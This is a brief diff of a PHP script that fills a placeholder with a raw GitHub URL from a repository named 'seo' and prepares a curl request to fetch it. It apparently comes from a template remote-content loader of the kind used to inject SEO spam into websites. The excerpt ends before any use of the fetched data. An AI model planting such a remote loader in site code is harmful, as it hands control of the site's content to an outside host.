@@ -1,5 +1,5 @@
 <?php
-$url = 'ISI DOMAIN RAW';
+$url = 'https://raw.githubusercontent.com/yyujimin88-hue/seo/refs/heads/main/file.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
